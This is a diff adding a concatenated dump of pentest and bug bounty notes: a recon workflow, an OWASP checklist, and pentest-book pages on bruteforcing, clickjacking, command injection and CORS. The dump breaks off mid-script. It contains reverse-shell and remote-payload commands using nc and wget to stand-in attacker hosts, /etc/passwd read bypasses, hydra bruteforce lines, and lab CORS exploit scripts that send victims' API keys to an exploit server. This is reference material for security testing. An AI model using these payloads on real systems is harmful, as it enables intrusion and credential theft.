@@ -1,0 +1,4409 @@
+]633;E;for f in Docs/BugBounty.md Docs/bugbounty_checklist.md Docs/six2dez\\ pentest-book\\ master\\ enumeration-web/*.md\x3b do echo "START_FILE: $f"\x3b cat "$f"\x3b echo "END_FILE"\x3b done > Docs/all_markdowns.txt;ad344e16-1613-405f-a766-1ae1ea405ddf]633;CSTART_FILE: Docs/BugBounty.md
+#### ======================================
+
+#### BUG BOUNTY WORKFLOW - RECON \& ANALYSIS
+
+#### ======================================
+
+#### 
+
+#### Note : Toujours respecter le scope (périmètre) du programme de Bug Bounty.
+
+#### 
+
+#### ---
+
+#### 1\. Reconnaissance de Sous-domaines (Enumeration)
+
+#### ---
+
+#### Objectif : Trouver tous les points d'entrée possibles.
+
+#### 
+
+#### \# WAF \& CMS:
+
+#### wafw00f https://target.com
+
+#### python3 cmseek.py -u target.com
+
+#### 
+
+#### 
+
+#### 
+
+#### \# 1. Subfinder (Rapide et efficace)
+
+#### subfinder -d target.com -all -v -o sub\_subfinder.txt
+
+#### 
+
+#### \# 2. Amass (Plus lent, mais très complet)
+
+#### amass enum -passive -d target.com -o sub\_amass.txt
+
+#### 
+
+#### \# 3. Assetfinder (Bon complément)
+
+#### assetfinder --subs-only target.com >> sub\_asset.txt
+
+#### 
+
+#### \# 4. Chaos (ProjectDiscovery)
+
+#### chaos -d target.com -o sub\_chaos.txt
+
+#### 
+
+#### \# 5. Sublist3r (Un classique)
+
+#### sublist3r -d target.com -o sub\_sublist3r.txt
+
+#### 
+
+#### \# Nettoyage et Consolidation :
+
+#### cat sub\_\*.txt > all\_subs\_raw.txt
+
+#### sort all\_subs\_raw.txt | uniq > all\_subs\_unique.txt
+
+#### 
+
+#### \# Vérifier le nombre
+
+#### cat all\_subs\_unique.txt | wc -l
+
+#### 
+
+#### ---
+
+#### 2\. Filtrage \& HTTP Probing (Live Check)
+
+#### ---
+
+#### Objectif : Ne travailler que sur ce qui répond.
+
+#### 
+
+#### \# Vérifier les domaines "live" + infos
+
+#### cat all\_subs\_unique.txt | httpx-toolkit -sc -title -server -tech-detect -o live\_subs\_detailed.txt
+
+#### 
+
+#### \# Créer une liste simple des URLs "live"
+
+#### cat live\_subs\_detailed.txt | awk '{print $1}' > live\_subs\_urls.txt
+
+#### 
+
+#### \# Subdomain Takeover Check (Rapide)
+
+#### subzy run --targets all\_subs\_unique.txt
+
+#### 
+
+#### ---
+
+#### 3\. Port Scanning
+
+#### ---
+
+#### Objectif : Trouver des services non-Web.
+
+#### 
+
+#### \# Scan rapide
+
+#### masscan -p1-65535 --rate 10000 -iL all\_subs\_unique.txt -oG masscan\_results.txt
+
+#### 
+
+#### \# Scan précis Nmap
+
+#### nmap -sC -sV -p- --open -iL live\_subs\_urls.txt -oN nmap\_results.txt
+
+#### 
+
+#### ---
+
+#### 4\. Content Discovery (Crawling \& Archives)
+
+#### ---
+
+#### Objectif : Trouver des URLs, endpoints et fichiers.
+
+#### 
+
+#### \# GAU (Get All Urls)
+
+#### gau target.com | tee urls\_gau.txt
+
+#### 
+
+#### \# Waybackurls
+
+#### waybackurls target.com > urls\_wayback.txt
+
+#### 
+
+#### \# Katana (Moteur moderne)
+
+#### katana -list live\_subs\_urls.txt -jc -kf -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -o urls\_katana.txt
+
+#### 
+
+#### \# Fusionner toutes les URLs trouvées
+
+#### cat urls\_\*.txt | sort | uniq > all\_urls\_global.txt
+
+#### 
+
+#### \# Extraction de fichiers sensibles (Grepping)
+
+#### cat all\_urls\_global.txt | grep -E "\\.txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config" > interesting\_files.txt
+
+#### 
+
+#### \# Isoler les fichiers Javascript
+
+#### cat all\_urls\_global.txt | grep ".js$" > js\_files.txt
+
+#### 
+
+#### ---
+
+#### 5\. Directory Fuzzing \& Bypass
+
+#### ---
+
+#### Objectif : Trouver des dossiers cachés (Admin, API, etc.).
+
+#### 
+
+#### \# FFUF (Standard)
+
+#### ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,403 -o ffuf\_results.txt
+
+#### 
+
+#### \# Dirsearch (Avec une liste d'extensions massive)
+
+#### dirsearch -u https://target.com -e php,cgi,htm,html,js,txt,bak,zip,old,conf,log,sql,json,xml,yaml,env -t 20 --exclude-status 404 --random-agent
+
+#### 
+
+#### \# 403 Bypass (Si un dossier admin répond 403 Forbidden)
+
+#### ./403-bypass.sh -u https://target.com/admin
+
+#### 
+
+#### ---
+
+#### 6\. Javascript Analysis
+
+#### ---
+
+#### Objectif : Trouver des clés API, des endpoints cachés et des secrets.
+
+#### 
+
+#### \# Analyse statique des liens
+
+#### python3 linkfinder.py -i https://target.com/script.js -o results.html
+
+#### 
+
+#### \# Scan de vulnérabilités dans les JS avec Nuclei
+
+#### cat js\_files.txt | nuclei -t /nuclei-templates/http/exposures/ -severity critical,high,medium
+
+#### 
+
+#### \# Extraction de secrets avec GF (Grep Friendly)
+
+#### cat js\_files.txt | gf apikeys > secrets\_found.txt
+
+#### 
+
+#### ---
+
+#### 7\. Parameters Discovery \& Vulnerability Scanning
+
+#### ---
+
+#### Objectif : Trouver les points d'injection.
+
+#### 
+
+#### \# Découverte de paramètres :
+
+#### python3 paramspider.py -d target.com --level high -o params\_spider.txt
+
+#### arjun -u https://target.com/api -m GET -o params\_arjun.json
+
+#### 
+
+#### \# Automation avec GF et Nuclei (Workflow Moderne) :
+
+#### 
+
+#### \# XSS
+
+#### cat all\_urls\_global.txt | gf xss | dalfox pipe -o xss\_verified.txt
+
+#### 
+
+#### \# LFI
+
+#### cat all\_urls\_global.txt | gf lfi | nuclei -tags lfi -o lfi\_results.txt
+
+#### 
+
+#### \# SSRF
+
+#### cat all\_urls\_global.txt | gf ssrf | nuclei -tags ssrf -o ssrf\_results.txt
+
+#### 
+
+#### \# SQL Injection
+
+#### cat all\_urls\_global.txt | gf sqli | sqlmap --batch --random-agent --level 1
+
+#### 
+
+#### ---
+
+#### 8\. Specific Checks (Git, API)
+
+#### ---
+
+#### 
+
+#### \# Git Recon:
+
+#### python3 GitDorker.py -d Dorks/medium\_dorks.txt -tf tokens.txt -q target.com
+
+#### python3 GitDumper.py https://target.com/.git /output-folder/
+
+#### 
+
+#### \# Bypass 403 Forbidden pages : 
+
+git clone https://github.com/Dheerajmadhukar/4-ZERO-3.git
+./403-bypass.sh -u https://exemple.com/test/ --exploit
+---
+
+
+
+END_FILE
+START_FILE: Docs/bugbounty_checklist.md
+# Bug Bounty Checklist for Web App
+
+> This checklist may help you to have a good methodology for bug bounty hunting  
+When you have done a action, don't forget to check ;)  
+Happy hunting !  
+
+## Table of Contents
+
+* [Recon on wildcard domain](#"Recon_on_wildcard_domain")
+* [Single domain](#Single_domain)
+* [Information Gathering](#Information)
+* [Configuration Management](#Configuration)
+* [Secure Transmission](#Transmission)
+* [Authentication](#Authentication)
+* [Session Management](#Session)
+* [Authorization](#Authorization)
+* [Data Validation](#Validation)
+* [Denial of Service](#Denial)
+* [Business Logic](#Business)
+* [Cryptography](#Cryptography)
+* [Risky Functionality - File Uploads](#File)
+* [Risky Functionality - Card Payment](#Card)
+* [HTML 5](#HTML)
+
+
+## <a name="Recon_on_wildcard_domain">Recon on wildcard domain</a>  
+
+- [ ] Run amass  
+- [ ] Run subfinder  
+- [ ] Run assetfinder  
+- [ ] Run dnsgen  
+- [ ] Run massdns  
+- [ ] Use httprobe  
+- [ ] Run aquatone (screenshot for alive host)  
+
+
+## <a name="Single_domain">Single Domain</a>  
+
+### Scanning  
+
+- [ ] Nmap scan   
+- [ ] Burp crawler   
+- [ ] ffuf (directory and file fuzzing)
+- [ ] hakrawler/gau/paramspider  
+- [ ] Linkfinder  
+- [ ] Url with Android application   
+
+### Manual checking  
+
+- [ ] Shodan  
+- [ ] Censys  
+- [ ] Google dorks  
+- [ ] Pastebin  
+- [ ] Github  
+- [ ] OSINT     
+
+### <a name="Information">Information Gathering</a>
+- [ ] Manually explore the site  
+- [ ] Spider/crawl for missed or hidden content  
+- [ ] Check for files that expose content, such as robots.txt, sitemap.xml, .DS_Store  
+- [ ] Check the caches of major search engines for publicly accessible sites  
+- [ ] Check for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)  
+- [ ] Perform Web Application Fingerprinting  
+- [ ] Identify technologies used  
+- [ ] Identify user roles  
+- [ ] Identify application entry points  
+- [ ] Identify client-side code  
+- [ ] Identify multiple versions/channels (e.g. web, mobile web, mobile app, web services)  
+- [ ] Identify co-hosted and related applications  
+- [ ] Identify all hostnames and ports  
+- [ ] Identify third-party hosted content  
+- [ ] Identify Debug parameters  
+
+
+### <a name="Configuration">Configuration Management</a>
+
+- [ ] Check for commonly used application and administrative URLs  
+- [ ] Check for old, backup and unreferenced files  
+- [ ] Check HTTP methods supported and Cross Site Tracing (XST)  
+- [ ] Test file extensions handling  
+- [ ] Test for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)  
+- [ ] Test for policies (e.g. Flash, Silverlight, robots)  
+- [ ] Test for non-production data in live environment, and vice-versa  
+- [ ] Check for sensitive data in client-side code (e.g. API keys, credentials)  
+
+
+### <a name="Transmission">Secure Transmission</a>
+
+- [ ] Check SSL Version, Algorithms, Key length  
+- [ ] Check for Digital Certificate Validity (Duration, Signature and CN)  
+- [ ] Check credentials only delivered over HTTPS  
+- [ ] Check that the login form is delivered over HTTPS  
+- [ ] Check session tokens only delivered over HTTPS  
+- [ ] Check if HTTP Strict Transport Security (HSTS) in use  
+
+
+
+### <a name="Authentication">Authentication</a>
+- [ ] Test for user enumeration  
+- [ ] Test for authentication bypass  
+- [ ] Test for bruteforce protection  
+- [ ] Test password quality rules  
+- [ ] Test remember me functionality  
+- [ ] Test for autocomplete on password forms/input  
+- [ ] Test password reset and/or recovery  
+- [ ] Test password change process  
+- [ ] Test CAPTCHA  
+- [ ] Test multi factor authentication  
+- [ ] Test for logout functionality presence  
+- [ ] Test for cache management on HTTP (eg Pragma, Expires, Max-age)  
+- [ ] Test for default logins  
+- [ ] Test for user-accessible authentication history  
+- [ ] Test for out-of channel notification of account lockouts and successful password changes  
+- [ ] Test for consistent authentication across applications with shared authentication schema / SSO  
+
+
+
+### <a name="Session">Session Management</a>
+- [ ] Establish how session management is handled in the application (eg, tokens in cookies, token in URL)  
+- [ ] Check session tokens for cookie flags (httpOnly and secure)  
+- [ ] Check session cookie scope (path and domain)  
+- [ ] Check session cookie duration (expires and max-age)  
+- [ ] Check session termination after a maximum lifetime  
+- [ ] Check session termination after relative timeout  
+- [ ] Check session termination after logout  
+- [ ] Test to see if users can have multiple simultaneous sessions  
+- [ ] Test session cookies for randomness  
+- [ ] Confirm that new session tokens are issued on login, role change and logout  
+- [ ] Test for consistent session management across applications with shared session management  
+- [ ] Test for session puzzling  
+- [ ] Test for CSRF and clickjacking  
+
+
+
+### <a name="Authorization">Authorization</a>
+- [ ] Test for path traversal  
+- [ ] Test for bypassing authorization schema  
+- [ ] Test for vertical Access control problems (a.k.a. Privilege Escalation)  
+- [ ] Test for horizontal Access control problems (between two users at the same privilege level)  
+- [ ] Test for missing authorization  
+
+
+### <a name="Validation">Data Validation</a>
+- [ ] Test for Reflected Cross Site Scripting  
+- [ ] Test for Stored Cross Site Scripting  
+- [ ] Test for DOM based Cross Site Scripting  
+- [ ] Test for Cross Site Flashing  
+- [ ] Test for HTML Injection  
+- [ ] Test for SQL Injection  
+- [ ] Test for LDAP Injection  
+- [ ] Test for ORM Injection  
+- [ ] Test for XML Injection  
+- [ ] Test for XXE Injection  
+- [ ] Test for SSI Injection  
+- [ ] Test for XPath Injection  
+- [ ] Test for XQuery Injection  
+- [ ] Test for IMAP/SMTP Injection  
+- [ ] Test for Code Injection  
+- [ ] Test for Expression Language Injection  
+- [ ] Test for Command Injection  
+- [ ] Test for Overflow (Stack, Heap and Integer)  
+- [ ] Test for Format String  
+- [ ] Test for incubated vulnerabilities  
+- [ ] Test for HTTP Splitting/Smuggling  
+- [ ] Test for HTTP Verb Tampering  
+- [ ] Test for Open Redirection  
+- [ ] Test for Local File Inclusion  
+- [ ] Test for Remote File Inclusion  
+- [ ] Compare client-side and server-side validation rules  
+- [ ] Test for NoSQL injection  
+- [ ] Test for HTTP parameter pollution  
+- [ ] Test for auto-binding  
+- [ ] Test for Mass Assignment  
+- [ ] Test for NULL/Invalid Session Cookie  
+
+### <a name="Denial">Denial of Service</a>
+- [ ] Test for anti-automation  
+- [ ] Test for account lockout  
+- [ ] Test for HTTP protocol DoS  
+- [ ] Test for SQL wildcard DoS  
+
+
+### <a name="Business">Business Logic</a>
+- [ ] Test for feature misuse  
+- [ ] Test for lack of non-repudiation  
+- [ ] Test for trust relationships  
+- [ ] Test for integrity of data  
+- [ ] Test segregation of duties  
+
+
+### <a name="Cryptography">Cryptography</a>
+- [ ] Check if data which should be encrypted is not  
+- [ ] Check for wrong algorithms usage depending on context  
+- [ ] Check for weak algorithms usage  
+- [ ] Check for proper use of salting  
+- [ ] Check for randomness functions  
+
+
+### <a name="File">Risky Functionality - File Uploads</a>
+- [ ] Test that acceptable file types are whitelisted  
+- [ ] Test that file size limits, upload frequency and total file counts are defined and are enforced  
+- [ ] Test that file contents match the defined file type  
+- [ ] Test that all file uploads have Anti-Virus scanning in-place.  
+- [ ] Test that unsafe filenames are sanitised  
+- [ ] Test that uploaded files are not directly accessible within the web root  
+- [ ] Test that uploaded files are not served on the same hostname/port  
+- [ ] Test that files and other media are integrated with the authentication and authorisation schemas  
+
+
+### <a name="Card">Risky Functionality - Card Payment</a>
+- [ ] Test for known vulnerabilities and configuration issues on Web Server and Web Application  
+- [ ] Test for default or guessable password  
+- [ ] Test for non-production data in live environment, and vice-versa  
+- [ ] Test for Injection vulnerabilities  
+- [ ] Test for Buffer Overflows  
+- [ ] Test for Insecure Cryptographic Storage  
+- [ ] Test for Insufficient Transport Layer Protection  
+- [ ] Test for Improper Error Handling  
+- [ ] Test for all vulnerabilities with a CVSS v2 score > 4.0  
+- [ ] Test for Authentication and Authorization issues  
+- [ ] Test for CSRF  
+
+
+### <a name="HTML">HTML 5</a>
+- [ ] Test Web Messaging  
+- [ ] Test for Web Storage SQL injection  
+- [ ] Check CORS implementation  
+- [ ] Check Offline Web Application  
+
+Source:  
+[OWASP](https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet)  
+
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/broken-links.md
+# Broken Links
+
+## Tools
+
+```bash
+# https://github.com/stevenvachon/broken-link-checker 
+blc -rfoi --exclude linkedin.com --exclude youtube.com --filter-level 3 https://example.com/
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/bruteforcing.md
+# Bruteforcing
+
+```bash
+cewl
+hash-identifier
+# https://github.com/HashPals/Name-That-Hash
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
+ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
+crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
+patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'
+hydra -l root -P password-file.txt 10.11.1.111 ssh
+hydra -P password-file.txt -v 10.11.1.111 snmp
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
+hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V
+hydra -L username.txt -p paswordl33t -t 4 ssh://10.10.1.111
+hydra -L user.txt -P pass.txt 10.10.1.111 ftp
+
+# PATATOR
+patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'
+
+# SIMPLE LOGIN GET
+hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V
+
+# GET FORM with HTTPS
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"
+
+# SIMPLE LOGIN POST
+hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I
+
+# API REST LOGIN POST
+hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64
+
+# Password spraying bruteforcer
+# https://github.com/x90skysn3k/brutespray
+python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5
+
+# Password generator
+# https://github.com/edoardottt/longtongue
+python3 longtongue.py
+
+https://many-passwords.github.io/
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/clickjacking.md
+# Clickjacking
+
+## General
+
+{% hint style="info" %}
+Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
+
+* Preventions:
+  * X-Frame-Options: deny/sameorigin/allow-from
+  * CSP: policy/frame-ancestors 'none/self/domain.com'
+{% endhint %}
+
+```markup
+# An example using the style tag and parameters is as follows:
+<head>
+  <style>
+    #target_website {
+      position:relative;
+      width:128px;
+      height:128px;
+      opacity:0.00001;
+      z-index:2;
+      }
+    #decoy_website {
+      position:absolute;
+      width:300px;
+      height:400px;
+      z-index:1;
+      }
+  </style>
+</head>
+...
+<body>
+  <div id="decoy_website">
+  ...decoy web content here...
+  </div>
+  <iframe id="target_website" src="https://vulnerable-website.com">
+  </iframe>
+</body>
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/command-injection.md
+# Command Injection
+
+{% hint style="info" %}
+Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.
+{% endhint %}
+
+```text
+# For detection, try to concatenate another command to param value
+&
+;
+Newline (0x0a or \n)
+&&
+|
+||
+# like: https://target.com/whatever?param=1|whoami
+
+# Blind (Time delay)
+https://target.com/whatever?param=x||ping+-c+10+127.0.0.1||
+
+# Blind (Redirect)
+https://target.com/whatever?param=x||whoami>/var/www/images/output.txt||
+
+# Blind (OOB)
+https://target.com/whatever?param=x||nslookup+burp.collaborator.address||
+https://target.com/whatever?param=x||nslookup+`whoami`.burp.collaborator.address||
+
+# Common params:
+cmd
+exec
+command
+execute
+ping
+query
+jump
+code
+reg
+do
+func
+arg
+option
+load
+process
+step
+read
+function
+req
+feature
+exe
+module
+payload
+run
+print
+
+# Useful Commands: Linux
+whoami
+ifconfig
+ls
+uname -a
+
+# Useful Commands: Windows
+whoami
+ipconfig
+dir
+ver
+
+# Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id 
+ls|id; ls |id; ls| id; ls | id 
+ls&&id; ls &&id; ls&& id; ls && id 
+ls&id; ls &id; ls& id; ls & id 
+ls %0A id
+
+# Time Delay Commands
+& ping -c 10 127.0.0.1 &
+
+# Redirecting output
+& whoami > /var/www/images/output.txt &
+
+# OOB (Out Of Band) Exploitation
+& nslookup attacker-server.com &
+& nslookup `whoami`.attacker-server.com &
+
+# WAF bypasses
+vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
+vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
+
+# Some filter bypasses
+cat /etc/passwd
+cat /e”t”c/pa”s”swd
+cat /’e’tc/pa’s’ swd
+cat /etc/pa??wd
+cat /etc/pa*wd
+cat /et’ ‘c/passw’ ‘d
+cat /et$()c/pa$()$swd
+{cat,/etc/passwd}
+cat /???/?????d
+
+# Tools
+https://github.com/commixproject/commix
+```
+
+
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/cookie-padding.md
+# Cookie Padding
+
+```bash
+# https://github.com/AonCyberLabs/PadBuster
+# Get cookie structure
+padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"
+# Get cookie for other user (impersonation)
+padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorhc0nwithyhackme'
+
+#https://github.com/glebarez/padre
+padre -u 'https://target.site/profile.php' -cookie 'SESS=$' 'Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg=='
+
+# https://github.com/Kibouo/rustpad
+
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/cors.md
+# CORS
+
+{% embed url="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities" %}
+
+## Tools
+
+```bash
+# https://github.com/s0md3v/Corsy
+python3 corsy.py -u https://example.com
+# https://github.com/chenjj/CORScanner
+python cors_scan.py -u example.com
+# https://github.com/Shivangx01b/CorsMe
+echo "https://example.com" | ./Corsme 
+cat subdomains.txt | ./httprobe -c 70 -p 80,443,8080,8081,8089 | tee http_https.txt
+cat http_https.txt | ./CorsMe -t 70
+# CORSPoc
+# https://tools.honoki.net/cors.html
+```
+
+| URL accessed                            | Access permitted?                  |
+| --------------------------------------- | ---------------------------------- |
+| http://normal-website.com/example/      | Yes: same scheme, domain, and port |
+| http://normal-website.com/example2/     | Yes: same scheme, domain, and port |
+| https://normal-website.com/example/     | No: different scheme and port      |
+| http://en.normal-website.com/example/   | No: different domain               |
+| http://www.normal-website.com/example/  | No: different domain               |
+| http://normal-website.com:8080/example/ | No: different port                 |
+
+{% hint style="info" %}
+In any site disclosing users & passwords (or other sensitive info), try CORS.
+{% endhint %}
+
+```
+# Simple test
+curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'
+
+# There are various exceptions to the same-origin policy:
+• Some objects are writable but not readable cross-domain, such as the location object or the location.href property from iframes or new windows.
+• Some objects are readable but not writable cross-domain, such as the length property of the window object (which stores the number of frames being used on the page) and the closed property.
+• The replace function can generally be called cross-domain on the location object.
+• You can call certain functions cross-domain. For example, you can call the functions close, blur and focus on a new window. The postMessage function can also be called on iframes and new windows in order to send messages from one domain to another.
+
+# Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.
+
+CORS good example:
+https://hackerone.com/reports/235200
+
+- CORS with basic origin reflection:
+
+    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".
+    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+    Send the request to Burp Repeater, and resubmit it with the added header: Origin: https://example.com
+    Observe that the origin is reflected in the Access-Control-Allow-Origin header.
+    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab and test it by clicking "view exploit":
+    <script>
+       var req = new XMLHttpRequest();
+       req.onload = reqListener;
+       req.open('get','$url/accountDetails',true);
+       req.withCredentials = true;
+       req.send();
+
+       function reqListener() {
+           location='/log?key='+this.responseText;
+       };
+    </script>
+    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
+    Go back to the exploit server and click "Deliver exploit to victim".
+    Click "Access log", retrieve and submit the victim's API key to complete the lab.
+
+ - Whitelisted null origin value
+
+     With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "My account".
+    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+    Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
+    Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
+    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab, $exploit-server-url with the exploit server URL, and test it by clicking "view exploit":
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+       var req = new XMLHttpRequest ();
+       req.onload = reqListener;
+       req.open('get','$url/accountDetails',true);
+       req.withCredentials = true;
+       req.send();
+
+       function reqListener() {
+           location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+       };
+    </script>"></iframe>
+    Notice the use of an iframe sandbox as this generates a null origin request. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
+    Go back to the exploit server and click "Deliver exploit to victim".
+    Click "Access log", retrieve and submit the victim's API key to complete the lab.
+
+- CORS with insecure certificate
+
+    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".
+    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+    Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
+    Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
+    Open a product page, click "Check stock" and observe that it is loaded using a HTTP URL on a subdomain.
+    Observe that the productID parameter is vulnerable to XSS.
+    Now browse to the exploit server, enter the following HTML, replacing $your-lab-url with your unique lab URL and $exploit-server-url with your exploit server URL and test it by clicking "view exploit":
+    <script>
+       document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+    </script>
+    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
+    Go back to the exploit server and click "Deliver exploit to victim".
+    Click "Access log", retrieve and submit the victim's API key to complete the lab.
+
+- CORS with pivot attack
+
+Step 1
+First we need to scan the local network for the endpoint. Replace $collaboratorPayload with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click store then "Deliver exploit to victim". Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
+<script>
+var q = [], collaboratorURL = 'http://$collaboratorPayload';
+for(i=1;i<=255;i++){
+  q.push(
+  function(url){
+    return function(wait){
+    fetchUrl(url,wait);
+    }
+  }('http://192.168.0.'+i+':8080'));
+}
+for(i=1;i<=20;i++){
+  if(q.length)q.shift()(i*100);
+}
+function fetchUrl(url, wait){
+  var controller = new AbortController(), signal = controller.signal;
+  fetch(url, {signal}).then(r=>r.text().then(text=>
+    {
+    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
+  }
+  ))
+  .catch(e => {
+  if(q.length) {
+    q.shift()(wait);
+  }
+  });
+  setTimeout(x=>{
+  controller.abort();
+  if(q.length) {
+    q.shift()(wait);
+  }
+  }, wait);
+}
+</script>
+Step 2
+Clear the code from stage 1 and enter the following code in the exploit server. Replace $ip with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with foundXSS=1 in the URL or you will see foundXSS=1 in the log.
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+  }
+  ))
+}
+
+fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+
+Step 3
+Clear the code from stage 2 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+  }
+  ))
+}
+
+fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+Step 4
+Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in steps 2 and 3. The code submits the form to delete carlos by injecting an iframe pointing to the /admin page.
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+  }
+  ))
